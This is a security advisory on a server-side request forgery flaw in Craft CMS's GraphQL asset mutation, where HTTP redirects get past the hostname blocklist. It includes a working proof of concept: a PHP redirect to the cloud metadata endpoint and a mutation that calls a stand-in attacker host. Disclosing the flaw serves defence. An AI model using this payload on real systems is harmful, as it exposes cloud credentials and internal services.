summary: "Craft CMS Vulnerable to SSRF in GraphQL Asset Mutation via HTTP Redirect\n## Summary\n\
  The `saveAsset` GraphQL mutation validates the initial URL hostname and resolved IP against\
  \ a blocklist, but Guzzle follows HTTP redirects by default. An attacker can bypass all SSRF\
  \ protections by hosting a redirect that points to cloud metadata endpoints or any internal\
  \ IP addresses.\n\n---\n## Proof of Concept\n1. Host a redirect script on your server (e.g.\
  \ `redirect.php`):\n```php\n<?php header(\"Location: http://169.254.169.254/latest/meta-data/\"\
  ); ?>\n```\n2. Send the following GraphQL mutation:\n```graphql\nmutation {\n    save_images_Asset(_file:\
  \ { \n        url: \"https://attacker.com/redirect.php\"\n        filename: \"metadata.txt\"\
  \n    }) {\n        id\n    }\n}\n```\n3. The application validates `attacker.com` (passes)\n\
  4. Guzzle follows the redirect to `169.254.169.254`\n5. Cloud metadata is saved as an asset\n\
  \n---\n## Mitigation\n- Disable redirects."
